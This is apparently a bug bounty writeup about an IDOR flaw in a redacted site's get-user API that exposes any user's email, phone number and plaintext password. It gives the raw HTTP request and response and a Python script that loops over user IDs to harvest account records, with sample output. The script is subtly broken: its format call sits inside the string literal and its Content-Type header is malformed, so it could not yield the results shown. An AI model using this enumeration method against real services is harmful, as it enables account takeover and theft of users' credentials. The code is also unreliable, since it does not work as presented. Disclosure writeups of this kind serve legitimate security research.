---
title: "IDOR leaks all user information including passwords"
tags:
- Bug Bounty
- IDOR
- Python
- Hacking
- Writeup
---

<h3 align="center">
  The story of how i was able to take over another user's account by exploiting the IDOR vulnerability.
</h3>

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## Overview

Insecure direct object reference (IDOR) is a type of access control vulnerability that arises when applications use user-supplied input to access objects directly. IDOR vulnerabilities are most often associated with horizontal privilege escalation, But can also arise in connection with vertical privilege escalation.

## How to find bugs?
I explored the API requests manually using the Burp Suite proxy, During the search I found the **/get-user** endpoint the endpoint was calling a **POST** request with a **data** parameter in the request body. The data parameter contains the user id value. On this request the hacker can obtain the information of any registered user.

## Account takeover
Using a **POST** request on the **/get-user** endpoint change the user id to another user id the response will contain important information about the user account including the password.

### Request

```
POST /api/landing-page/get-user HTTP/1.1
Host: redacted.com

guid=&code=0&data={"user_id":"<user_id>"}
```

### Response
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "code": "0",
  "info": "Successfully Get User Results",
  "data": {
    "id": 1,
    "nama": "user1",
    "email": "user1@gmail.com",
    "msisdn": "121212122",
    "institusi": "",
    "password": "user1password",
    "create_dtm": "2021-07-07T02:13:13.000Z",
    "nonce": "6603",
    "status_otp": 1,
    "status_otp_info": "{\"code\":\"0\",\"info\":\"OTP code sent successfully.\",\"data\":[]}",
    "status_otp_count": 0,
    "last_login": "2023-01-19T02:00:35.000Z"
  }
}
```

## Increase impact
I wrote python code to increase its impact where this python script carries out a Brute Force attack to guess the user ID stored in the database. Using python's **requests** library I can make a **POST** request to the server and use a **for** loop to guess the user id and if the user id is valid it will display

```
#!/usr/bin/env python3

from requests import Session
import os

s = Session()
for i in range(10):
    r = s.post("https://redacted.com/api/landing-page/get-user", data='guid=&code=0&data={"user_id":"{}".format(i)} ', headers={'User-Agent': f'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/{i}', 'Content-Type': 'application/x-www-form -urlencoded'})
    if len(r.text) > 350:
        print(r.text + os.linesep)
    else:
        pass
```

### The Results

```
$ python3 main.py
```

```
{
  "code": "0",
  "info": "Successfully Get User Results",
  "data": {
    "id": 1,
    "nama": "user1",
    "email": "user1@gmail.com",
    "msisdn": "121212122",
    "institusi": "",
    "password": "user1password",
    "create_dtm": "2021-07-07T02:13:13.000Z",
    "nonce": "6603",
    "status_otp": 1,
    "status_otp_info": "{\"code\":\"0\",\"info\":\"OTP code sent successfully.\",\"data\":[]}",
    "status_otp_count": 0,
    "last_login": "2023-01-19T02:00:35.000Z"
  }
},
{
  "code": "0",
  "info": "Successfully Get User Results",
  "data": {
    "id": 2,
    "nama": "user2",
    "email": "user2@gmail.com",
    "msisdn": "786878878",
    "institusi": "",
    "password": "user2password",
    "create_dtm": "2021-07-07T02:13:13.000Z",
    "nonce": "6603",
    "status_otp": 1,
    "status_otp_info": "{\"code\":\"0\",\"info\":\"OTP code sent successfully.\",\"data\":[]}",
    "status_otp_count": 0,
    "last_login": "2023-01-19T02:00:35.000Z"
  }
},
{
  "code": "0",
  "info": "Successfully Get User Results",
  "data": {
    "id": 3,
    "nama": "user3",
    "email": "user3@gmail.com",
    "msisdn": "64643664",
    "institusi": "",
    "password": "user3password",
    "create_dtm": "2021-07-07T02:13:13.000Z",
    "nonce": "6603",
    "status_otp": 1,
    "status_otp_info": "{\"code\":\"0\",\"info\":\"OTP code sent successfully.\",\"data\":[]}",
    "status_otp_count": 0,
    "last_login": "2023-01-19T02:00:35.000Z"
  }
}
```

## Eventually
![image](https://raw.githubusercontent.com/thd3r/thd3r.github.io/master/assets/images/writeup/2023-07-04-IDOR_1/Screenshot_2023-07-04_01-04-06.png)

## Conclusion
Check incoming traffic including some API requests sometimes you might miss them. Then try to report it by creating a script/exploit that helps them make it easier to reproduce our findings, Which can be a plus as well as practicing coding.

That's it, thanks for reading.
